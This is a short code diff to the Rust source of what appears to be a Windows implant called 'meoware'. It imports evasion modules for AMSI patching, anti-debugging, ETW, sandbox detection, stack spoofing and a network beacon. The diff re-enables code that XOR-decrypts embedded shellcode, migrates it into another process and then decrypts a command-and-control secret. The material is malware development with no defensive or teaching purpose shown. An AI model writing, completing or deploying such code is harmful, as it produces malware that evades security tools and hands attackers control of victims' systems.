@@ -1,7 +1,7 @@
 #![cfg_attr(not(any(debug_assertions, feature = "verbose")), no_std)]
 
 use meoware::core::net::beacon;
-use meoware::core::{amsi, anti_debug, etw, migration, nt, sandbox, spoof, ssn_table};
+use meoware::core::{amsi, anti_debug, etw, migration, sandbox, spoof, ssn_table};
 use meoware::debug;
 
 // Build time generated key
@@ -40,12 +40,12 @@ fn main() {
         amsi::patch_amsi();
         spoof::initialize_spoof_gadgets();
 
-        // let shellcode = xor_decrypt(ENCRYPTED_SC, &XOR_KEY);
-        // debug!("[*] Migrating ({} bytes)", shellcode.len());
-        // if migration::self_migrate(&shellcode) {
-        //     debug!(" [*] Done - exiting");
-        //     return;
-        // }
+        let shellcode = xor_decrypt(ENCRYPTED_SC, &XOR_KEY);
+        debug!("[*] Migrating ({} bytes)", shellcode.len());
+        if migration::self_migrate(&shellcode) {
+            debug!(" [*] Done - exiting");
+            return;
+        }
 
         let c2_secret = xor_decrypt(&C2_SECRET_ENC, &XOR_KEY);
 
